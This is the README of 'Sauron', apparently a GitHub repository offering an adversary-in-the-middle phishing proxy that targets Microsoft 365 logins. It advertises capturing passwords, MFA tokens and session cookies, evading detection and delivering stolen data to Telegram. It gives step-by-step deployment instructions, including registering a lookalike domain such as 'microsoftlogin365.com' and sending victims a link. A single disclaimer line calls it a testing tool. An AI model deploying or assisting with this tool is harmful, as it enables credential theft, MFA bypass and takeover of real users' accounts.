
# Sauron - Microsoft 365 MITM Proxy

A powerful phishing tool that intercepts Microsoft 365 login flows to capture credentials, cookies, and session data in real-time.

## ✨ What It Does

- **Captures Credentials**: Gets usernames, passwords, and 2FA tokens
- **Steals Sessions**: Harvests authentication cookies
- **Real-time Monitoring**: WebSocket dashboard for live campaign tracking
- **Auto SSL**: Automatic HTTPS certificates via Let's Encrypt
- **Advanced Evasion**: Bot detection bypass and traffic obfuscation

## 🚀 Quick Start

### 1. Requirements

- Ubuntu 20.04+ server with root access
- Domain name (buy from any registrar)
- Cloudflare account (free)

### 2. Setup Your Domain

1. Buy a domain like `microsoftlogin365.com`
2. Add it to Cloudflare (free account)
3. Set DNS: `*.yourdomain.com` → your server IP

### 3. Install

```bash
# Clone the repository
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro

# Build release package
./scripts/build-release.sh v1.0.0

# Go to the built release
cd release-v1.0.0/sauron

# Run interactive setup
./configure-env.sh setup

# Install and start
sudo ./install-production.sh
```

### 4. Configure

The setup script will ask for:

- **Domain**: Your purchased domain (e.g., `microsoftlogin365.com`)
- **Cloudflare API Token**: Get from Cloudflare dashboard
- **Turnstile Secret**: Get from Cloudflare Turnstile settings

### 5. Create Operation

1. Open the admin dashboard: `https://yourdomain.com/admin`
2. Create a new slug (unique operation ID)
3. Send targets to: `https://login.yourdomain.com/your-slug`

## 📱 Usage

### Managing Operations

```bash
# Check status
sudo systemctl status sauron

# View live logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron
```

### Getting Results

- **Telegram**: Auto-delivery of captured data
- **WebSocket Dashboard**: Real-time monitoring
- **Logs**: JSON formatted results in system logs

## 🛡️ Features

- **TLS Interception**: Full Microsoft 365 flow capture
- **Anti-Detection**: Bypasses modern security measures
- **Cookie Harvesting**: Maintains persistent access
- **2FA Bypass**: Captures MFA tokens and session cookies
- **Operation Isolation**: Multiple simultaneous operations

## 📚 Documentation

For detailed setup guides, troubleshooting, and advanced features:
**[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**

## ⚠️ Legal Notice

This tool is for authorized security testing only. Users are responsible for compliance with applicable laws and regulations.

## 🔧 Build from Source

```bash
# Clone repository
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro

# Build release package
./scripts/build-release.sh v1.0.0

# Deploy to server
scp release-v1.0.0/sauron-v1.0.0-linux-amd64.tar.gz root@your-server:/tmp/
ssh root@your-server "cd /tmp && tar -xzf sauron-v1.0.0-linux-amd64.tar.gz && cd sauron && ./install-production.sh"
```

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/Skillz147/Sauron-Pro/issues)
- **Documentation**: [GitHub Pages](https://skillz147.github.io/Sauron-Pro)
- **Security Reports**: Private disclosure preferred
